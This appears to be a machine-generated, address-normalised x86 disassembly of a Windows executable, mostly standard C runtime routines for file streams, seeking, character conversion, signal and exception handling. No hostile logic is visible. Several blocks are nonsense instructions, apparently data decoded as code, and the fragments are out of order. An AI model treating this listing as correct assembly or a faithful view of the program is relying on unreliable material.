mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_424ba5
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne rwxdata
push ecx
call sub_424ba5
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_42c2ec
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rwxdata ]
test eax eax
je rwxdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp rwxdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp rwxdata
push 0xa
call sub_424ce1
push 0x16
call sub_42cc2c
pop ecx
pop ecx
push 0x3
call sub_422f28
and [ ebp - 0x4 ] 0x0
sub_42c342
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rwxdata ]
test eax eax
je rwxdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_42c2ec
mov [ ebp - 0x4 ] 0x1
call eax
jmp rwxdata
and [ ebp - 0x4 ] 0x0
sub_42c398
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je rwxdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne rwxdata
test al 0x2
je rwxdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne rwxdata
or al 0x20
mov [ esi + 0xc ] eax
jmp rwxdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_4268e8
pop ecx
jmp rwxdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je rwxdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_427eae
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je rwxdata
mov edx [ esi + 0xc ]
test dl 0x82
jne rwxdata
cmp [ esi + 0x18 ] 0x200
jne rwxdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je rwxdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je rwxdata
mov edi rwxdata
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rwxdata ]
lea edi [ edi + ecx * 8 ]
jmp rwxdata
test ch 0x4
jne rwxdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne rwxdata
mov [ esi + 0x18 ] 0x1000
sub_42c471
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] eax
mov [ ebp - 0x8 ] esi
jge rwxdata
push 0x1
push eax
push eax
push esi
call sub_42cb7b
mov ecx edx
add esp 0x10
mov ebx eax
mov [ ebp - 0xc ] ecx
test ecx ecx
mov [ ebp - 0x10 ] ebx
jg rwxdata
mov [ edi + 0x4 ] eax
test [ edi + 0xc ] 0x108
jne rwxdata
jl rwxdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov edx eax
sub edx ecx
mov [ ebp - 0x4 ] edx
mov edx [ edi + 0xc ]
test dl 0x3
je rwxdata
mov eax [ edi + 0x4 ]
cdq
sub ebx eax
sbb ecx edx
mov eax ebx
mov edx ecx
jmp rwxdata
or edx 0xffffffff
mov eax edx
jmp rwxdata
test ebx ebx
jb rwxdata
test dl 0x80
jne rwxdata
mov edx esi
mov ebx esi
sar edx 0x5
and ebx 0x1f
mov edx [ edx * 4 + rwxdata ]
test [ edx + ebx * 8 + 0x4 ] 0x80
je rwxdata
pop edi
pop esi
pop ebx
leave
retn
or ebx [ ebp - 0xc ]
jne rwxdata
mov [ rwxdata ] 0x16
mov ebx [ ebp - 0x10 ]
mov edx ecx
test [ edi + 0xc ] 0x1
je rwxdata
mov eax [ ebp - 0x4 ]
xor edx edx
jmp rwxdata
cmp [ edx ] 0xa
jne rwxdata
mov eax [ ebp - 0x4 ]
xor edx edx
add eax [ ebp - 0x10 ]
adc edx [ ebp - 0xc ]
mov edx [ edi + 0x4 ]
test edx edx
jne rwxdata
inc edx
jmp rwxdata
inc [ ebp - 0x4 ]
sub eax ecx
add eax edx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x80
je rwxdata
and [ ebp - 0x4 ] edx
jmp rwxdata
cmp edx eax
jae rwxdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x10 ] eax
sbb [ ebp - 0xc ] 0x0
push 0x2
push 0x0
push 0x0
push [ ebp - 0x8 ]
call sub_42cb7b
add esp 0x10
cmp eax [ ebp - 0x10 ]
jne rwxdata
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
call sub_42cb7b
mov eax 0x200
add esp 0x10
cmp [ ebp + 0x8 ] eax
ja rwxdata
cmp edx [ ebp - 0xc ]
jne rwxdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je rwxdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
inc [ ebp + 0x8 ]
test ch 0x4
je rwxdata
test [ edi + 0xd ] 0x20
jmp rwxdata
cmp [ eax ] 0xa
jne rwxdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
je rwxdata
inc eax
jmp rwxdata
inc [ ebp + 0x8 ]
cmp eax ecx
jae rwxdata
sub_42c5f8
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge rwxdata
push 0x1
push ebx
push esi
call sub_4266a1
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl rwxdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp rwxdata
mov edx [ edi + 0xc ]
test dx 0x108
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov ebx eax
sub ebx ecx
test dl 0x3
mov [ ebp - 0x8 ] ebx
je rwxdata
sub eax [ edi + 0x4 ]
jmp rwxdata
test dl 0x80
jne rwxdata
mov edx esi
mov ebx esi
sar edx 0x5
and ebx 0x1f
mov edx [ edx * 4 + rwxdata ]
test [ edx + ebx * 8 + 0x4 ] 0x80
je rwxdata
cmp [ ebp - 0x4 ] 0x0
jne rwxdata
mov [ rwxdata ] 0x16
mov edx ecx
test [ edi + 0xc ] 0x1
je rwxdata
mov eax [ ebp - 0x8 ]
jmp rwxdata
cmp [ edx ] 0xa
jne rwxdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov edx [ edi + 0x4 ]
test edx edx
jne rwxdata
inc edx
jmp rwxdata
inc [ ebp - 0x8 ]
sub eax ecx
add eax edx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x80
je rwxdata
and [ ebp - 0x8 ] edx
jmp rwxdata
cmp edx eax
jae rwxdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_4266a1
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne rwxdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_4266a1
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja rwxdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je rwxdata
test [ edi + 0xd ] 0x20
jmp rwxdata
cmp [ eax ] 0xa
jne rwxdata
inc [ ebp + 0x8 ]
test ch 0x4
je rwxdata
je rwxdata
inc eax
jmp rwxdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae rwxdata
sub_42c750
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je rwxdata
mov [ rwxdata ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je rwxdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne rwxdata
cmp edi 0x1
je rwxdata
push esi
call sub_423fbb
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je rwxdata
push esi
call sub_42c471
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne rwxdata
test al 0x1
je rwxdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp rwxdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x10 ]
call sub_42cb7b
and eax edx
add esp 0x10
cmp eax 0xffffffff
je rwxdata
test al 0x8
je rwxdata
or eax 0xffffffff
xor eax eax
jmp rwxdata
test ah 0x4
jne rwxdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_42c7e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
test al 0x82
mov [ ebp - 0x4 ] ecx
je rwxdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne rwxdata
xor ebx ebx
test al 0x1
je rwxdata
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] ebx
and al 0xef
mov [ ebp + 0xc ] ebx
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne rwxdata
test al 0x10
mov [ esi + 0x4 ] ebx
je rwxdata
test [ esi + 0xc ] 0x108
push edi
je rwxdata
cmp esi rwxdata
je rwxdata
mov edx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] edx
mov [ esi + 0xc ] eax
mov ebx [ ebp + 0x8 ]
push 0x2
pop edi
lea eax [ ebp + 0x8 ]
push edi
push eax
push ecx
mov [ ebp + 0x8 ] bx
call sub_42673b
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea edx [ eax + 0x2 ]
mov [ esi ] edx
mov edx [ esi + 0x18 ]
dec edx
dec edx
cmp edi ebx
mov [ esi + 0x4 ] edx
jle rwxdata
push ecx
call sub_42692c
test eax eax
pop ecx
jne rwxdata
cmp esi rwxdata
jne rwxdata
mov eax ebx
and eax 0xffff
jmp rwxdata
or [ esi + 0xc ] 0x20
jmp rwxdata
cmp ecx 0xffffffff
je rwxdata
push edi
push eax
push ecx
call sub_42673b
add esp 0xc
mov [ ebp + 0xc ] eax
jmp rwxdata
mov ecx [ ebp - 0x4 ]
push esi
call sub_4268e8
pop ecx
pop esi
pop ebx
leave
retn
mov eax 0xffff
mov eax rwxdata
mov eax ecx
mov edx ecx
sar eax 0x5
and edx 0x1f
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + edx * 8 ]
jmp rwxdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp rwxdata
push 0x2
push ebx
push ecx
call sub_4266a1
add esp 0xc
test [ eax + 0x4 ] 0x20
je rwxdata
cmp [ ebp + 0xc ] edi
pop edi
je rwxdata
sub_42c904
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je rwxdata
mov eax 0xffff
pop esi
retn
test al 0x40
jne rwxdata
test al 0x2
je rwxdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne rwxdata
or al 0x20
mov [ esi + 0xc ] eax
jmp rwxdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_4268e8
pop ecx
jmp rwxdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0x1
je rwxdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_427eae
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je rwxdata
cmp eax 0xffffffff
je rwxdata
mov edx [ esi + 0xc ]
test dl 0x82
jne rwxdata
cmp [ esi + 0x18 ] 0x200
jne rwxdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je rwxdata
mov ecx [ esi ]
add eax 0xfffffffe
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je rwxdata
mov edi rwxdata
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rwxdata ]
lea edi [ edi + ecx * 8 ]
jmp rwxdata
test ch 0x4
jne rwxdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne rwxdata
mov [ esi + 0x18 ] 0x1000
sub_42c9e8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je rwxdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je rwxdata
mov al [ esi ]
cmp al bl
jne rwxdata
cmp [ rwxdata ] ebx
jne rwxdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je rwxdata
mov ecx [ rwxdata ]
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je rwxdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je rwxdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push 0x9
push [ rwxdata ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne rwxdata
mov eax [ rwxdata ]
cmp eax 0x1
jle rwxdata
push 0x1
pop eax
jmp rwxdata
movzx ax al
mov [ ecx ] ax
jmp rwxdata
cmp [ ebp + 0x10 ] eax
jb rwxdata
cmp [ ebp + 0x10 ] eax
jl rwxdata
pop esi
pop ebx
pop ebp
retn
mov [ rwxdata ] 0x2a
or eax 0xffffffff
jmp rwxdata
cmp [ esi + 0x1 ] bl
jne rwxdata
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push eax
push esi
push 0x9
push [ rwxdata ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ rwxdata ]
jne rwxdata
sub_42cab0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
cmp [ eax + 0x10 ] 0x3
jne rwxdata
xor eax eax
push eax
call sub_42cb4c
test eax eax
pop ecx
je rwxdata
cmp [ eax + 0x14 ] 0x19930520
jne rwxdata
push esi
call [ rwxdata ]
jmp rwxdata
jmp sub_42c2ec
pop esi
retn 0x4
sub_42cb7b
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push esi
cmp eax [ rwxdata ]
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rwxdata ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je rwxdata
mov ecx [ ebp + 0xc ]
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
call sub_426b1f
cmp eax 0xffffffff
pop ecx
jne rwxdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne rwxdata
mov [ rwxdata ] 0x9
jmp rwxdata
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
mov edx [ ebp - 0x4 ]
lea eax [ eax + esi + 0x4 ]
mov eax [ ebp - 0x8 ]
jmp rwxdata
call [ GetLastError@IAT ]
test eax eax
je rwxdata
or eax 0xffffffff
or edx 0xffffffff
pop edi
pop esi
leave
retn
push eax
call sub_42658d
pop ecx
jmp rwxdata
sub_42cc2c
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je rwxdata
mov esi [ rwxdata ]
mov eax rwxdata
dec eax
dec eax
je rwxdata
test esi esi
jne rwxdata
xor eax eax
jmp rwxdata
push edi
call sub_42cd59
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp rwxdata
sub eax 0x4
je rwxdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je rwxdata
push 0x3
call sub_422f28
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne rwxdata
sub eax 0x3
je rwxdata
mov ebx [ rwxdata ]
and [ rwxdata ] 0x0
cmp edi ecx
jne rwxdata
cmp edi 0xb
je rwxdata
sub eax 0x4
je rwxdata
and [ eax ] 0x0
cmp edi ecx
jne rwxdata
mov edx [ rwxdata ]
mov [ rwxdata ] 0x8c
mov [ ebp + 0x8 ] edx
jmp rwxdata
cmp edi 0x4
jne rwxdata
mov esi [ rwxdata ]
mov eax rwxdata
jmp rwxdata
sub eax 0x6
je rwxdata
push edi
call esi
cmp edi 0xb
pop ecx
je rwxdata
push [ rwxdata ]
push 0x8
call esi
pop ecx
pop ecx
jmp rwxdata
cmp edi ecx
jne rwxdata
mov ebx [ ebp + 0x8 ]
mov esi [ rwxdata ]
mov eax rwxdata
jmp rwxdata
dec eax
je rwxdata
cmp edi 0x8
mov [ rwxdata ] ebx
jne rwxdata
cmp edi 0x4
jne rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
add ecx eax
cmp eax ecx
jge rwxdata
mov esi [ rwxdata ]
mov eax rwxdata
jmp rwxdata
or eax 0xffffffff
jmp rwxdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rwxdata ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne rwxdata
jmp rwxdata
sub_42cd59
mov edx [ esp + 0x4 ]
mov ecx [ rwxdata ]
cmp [ rwxdata ] edx
push esi
mov eax rwxdata
je rwxdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rwxdata ]
cmp eax ecx
jae rwxdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rwxdata ]
xor eax eax
cmp [ eax + 0x4 ] edx
je rwxdata
cmp [ eax + 0x4 ] edx
jne rwxdata
retn
add eax 0xc
cmp eax esi
jae rwxdata
sub_4011b0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al [ ecx + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al

sub_41e281
ror dh 0x1
arpl bx si
0xeee9
sub_41e2bf
imul ecx [ eax ] 0x925a5443
frstor [ edx + 0x4e5e7f0e ]
add al 0xd9
pop esp
pop es
adc al dl
push eax
imul eax ebp 0x55a2f2ea
arpl [ ebp + 0x68 ] si
retn 0x42aa
sub_42184b
dec [ eax ]
retn 0x42
sub_42185b
[ edx - 0x3e ]
sub_42186b
inc [ eax ]
add [ eax ] al
add [ 0x42c3 ] bh
add [ eax ] al
add [ ecx ] ch
retn
sub_421f04
push sub_421f10
call sub_42247a
pop ecx
retn
sub_421f10
mov ecx rwxdata
jmp sub_428848
sub_421f1a
call sub_421f24
jmp sub_421f2e
sub_421f24
mov ecx rwxdata
jmp sub_429725
sub_421f2e
push sub_421f3a
call sub_42247a
pop ecx
retn
sub_421f3a
mov ecx rwxdata
jmp sub_42988c
sub_4223d9
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov cl [ eax ]
mov dl [ esi ]
mov [ eax ] dl
mov [ esi ] cl
pop esi
retn
sub_4223ec
test [ rwxdata ] 0x1
jne rwxdata
jmp sub_422401
or [ rwxdata ] 0x1
sub_422401
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_42247a
push [ esp + 0x4 ]
call sub_42240d
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_422c26
cmp [ rwxdata ] 0x1
jne rwxdata
push [ esp + 0x4 ]
call sub_424ce1
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_424ca8
sub_422eea
mov eax [ rwxdata ]
test eax eax
je rwxdata
push sub_4011b0
push rwxdata
call sub_422fd2
push rwxdata
push rwxdata
call sub_422fd2
add esp 0x10
retn
call eax
sub_422f17
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_422f39
add esp 0xc
retn
sub_422f28
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_422f39
add esp 0xc
retn
sub_423e0e
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_423e1b
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_423e2b
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_424017
push 0x1
call sub_424020
pop ecx
retn
sub_424132
call sub_424017
cmp [ rwxdata ] 0x0
je rwxdata
retn
jmp sub_426c64
sub_424af8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je rwxdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_424b82
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_424af8
jne rwxdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne rwxdata
mov eax 0x1
sub_424bae
push ebx
push ecx
mov ebx rwxdata
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_424c8d
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_424b1a
add esp 0x8
pop ebp
retn 0x4
sub_42692c
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jb rwxdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_426cbc
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_426ccd
add esp 0xc
retn
sub_4270c2
cmp [ rwxdata ] 0x0
jne rwxdata
retn
push 0xfffffffd
call sub_426cfe
pop ecx
mov [ rwxdata ] 0x1
sub_4270de
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4270f5
add esp 0x10
retn
sub_427b6e
push 0x1
pop eax
retn
sub_427bdd
push 0x1
pop eax
retn
sub_427ea5
push 0x2
call sub_422c01
pop ecx
retn
sub_4281b4
push 0x1
pop eax
retn
sub_428268
push 0x1
pop eax
retn
sub_4283c1
push 0x1
pop eax
retn
sub_42857d
call sub_428587
jmp sub_428594
sub_428587
push 0x0
mov ecx rwxdata
call sub_428be1
retn
sub_428594
push sub_4285a0
call sub_42247a
pop ecx
retn
sub_4285a0
mov ecx rwxdata
jmp sub_428bec
sub_4285aa
call sub_4285b4
jmp sub_4285c1
sub_4285b4
push 0x0
mov ecx rwxdata
call sub_428be1
retn
sub_4285c1
push sub_4285cd
call sub_42247a
pop ecx
retn
sub_4285cd
mov ecx rwxdata
jmp sub_428bec
sub_4285d7
call sub_4285e1
jmp sub_4285f0
sub_4285e1
push 0x1
push 0x0
mov ecx rwxdata
call sub_4289ab
retn
sub_4285f0
push sub_4285fc
call sub_42247a
pop ecx
retn
sub_4285fc
mov ecx rwxdata
jmp sub_428606
sub_428606
mov eax [ ecx ]
add ecx 0x8
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] rwxdata
jmp sub_428938
sub_42861b
call sub_428625
jmp sub_428634
sub_428625
push 0x1
push 0x0
mov ecx rwxdata
call sub_4288d9
retn
sub_428634
push sub_428640
call sub_42247a
pop ecx
retn
sub_428640
mov ecx rwxdata
jmp sub_42864a
sub_42864a
mov eax [ ecx ]
add ecx 0x4
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] rwxdata
jmp sub_428938
sub_42865f
call sub_428669
jmp sub_428676
sub_428669
push 0x0
mov ecx rwxdata
call sub_428be1
retn
sub_428676
push sub_428682
call sub_42247a
pop ecx
retn
sub_428682
mov ecx rwxdata
jmp sub_428bec
sub_42868c
call sub_428696
jmp sub_4286a5
sub_428696
push 0x1
push 0x0
mov ecx rwxdata
call sub_4288d9
retn
sub_4286a5
push sub_4286b1
call sub_42247a
pop ecx
retn
sub_4286b1
mov ecx rwxdata
jmp sub_42864a
sub_4286bb
call sub_4286c5
jmp sub_4286d4
sub_4286c5
push 0x1
push 0x0
mov ecx rwxdata
call sub_4288d9
retn
sub_4286d4
push sub_4286e0
call sub_42247a
pop ecx
retn
sub_4286e0
mov ecx rwxdata
jmp sub_42864a
sub_428848
dec [ rwxdata ]
jne rwxdata
retn
mov ecx rwxdata
call sub_42997c
mov ecx rwxdata
call sub_42997c
mov ecx rwxdata
jmp sub_42997c
sub_428938
mov [ ecx ] rwxdata
jmp sub_42a5dc
sub_428abd
mov [ ecx ] rwxdata
add ecx 0x34
jmp sub_428a89
sub_428acb
or eax 0xffffffff
retn 0x4
sub_428ad1
or eax 0xffffffff
retn
sub_428bdc
mov eax ecx
retn 0x8
sub_428be1
mov eax ecx
mov [ eax ] rwxdata
retn 0x4
sub_429023
push esi
lea esi [ ecx - 0x4 ]
mov ecx esi
call sub_42864a
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_429042
push esi
mov esi ecx
call sub_428938
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42905e
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_428606
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42907d
push esi
mov esi ecx
call sub_428abd
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_429099
push esi
mov esi ecx
call sub_428bec
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_4291f1
mov eax [ ecx + 0x2c ]
inc [ eax ]
mov eax [ ecx + 0x1c ]
dec [ eax ]
mov eax [ ecx + 0x1c ]
mov eax [ eax ]
retn
sub_429201
mov eax [ ecx + 0x2c ]
dec [ eax ]
mov ecx [ ecx + 0x1c ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
retn
sub_429211
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
retn
sub_429457
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
add eax 0x2
test eax eax
jge rwxdata
push eax
call sub_42b588
mov [ ebp + 0x8 ] eax
pop ecx
mov eax rwxdata
retn
xor eax eax
sub_429522
test [ rwxdata ] 0x1
jne rwxdata
call sub_42954c
test [ rwxdata ] 0x1
jne rwxdata
or [ rwxdata ] 0x1
jmp sub_429558
or [ rwxdata ] 0x1
sub_42954c
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_429558
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_429564
call sub_42956e
jmp sub_429578
sub_42956e
mov ecx rwxdata
jmp sub_4286ea
sub_429578
push sub_429584
call sub_42247a
pop ecx
retn
sub_429584
mov ecx rwxdata
jmp sub_428848
sub_42958e
call sub_429598
jmp sub_4295a2
sub_429598
mov ecx rwxdata
jmp sub_429725
sub_4295a2
push sub_4295ae
call sub_42247a
pop ecx
retn
sub_4295ae
mov ecx rwxdata
jmp sub_42988c
sub_4295b8
call sub_4295c2
jmp sub_4295cf
sub_4295c2
push 0x0
mov ecx rwxdata
call sub_429cb6
retn
sub_4295cf
push sub_4295db
